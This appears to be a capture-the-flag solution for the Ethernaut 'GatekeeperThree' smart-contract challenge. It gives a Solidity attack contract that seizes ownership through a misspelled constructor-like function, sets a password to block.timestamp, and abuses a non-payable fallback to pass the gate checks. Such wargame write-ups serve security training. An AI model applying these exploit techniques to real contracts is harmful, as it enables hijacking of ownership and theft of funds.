To pass the gatekeeper we need to call `GatekeeperThreeSolution.enterGate(gatekeeperAddress)` with an ether amount greater than `0.001` `ether`.
<br>
For example, we can pass the following amount of `wei`:
```js
toWei("0.0010000001")
// '1000000100000000'
```

##

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function enter() external;
}

contract GatekeeperThreeSolution {
    function enterGate(address payable _gatekeeper) external payable {
        require(msg.value > 0.001 ether, 'Need more ether to pass "gateThree"');
        IGatekeeperThree gk = IGatekeeperThree(_gatekeeper);
        // Overriding owner (required to pass "gateOne").
        gk.construct0r();
        // Required for "gateTwo".
        gk.createTrick();
        // Overriding password to equal "block.timestamp".
        gk.getAllowance(0);
        // Setting "allowEntrance" (required to pass "gateTwo").
        gk.getAllowance(block.timestamp);
        // Sending required amount of ether (required to pass "gateThree").
        (bool success,) = _gatekeeper.call{value: msg.value}("");
        require(success, "Failed to send ether. No point to continue - will not pass gateThree");

        gk.enter();
    }

    // Non payable (required to pass "gateThree").
    fallback() external {}
}
```
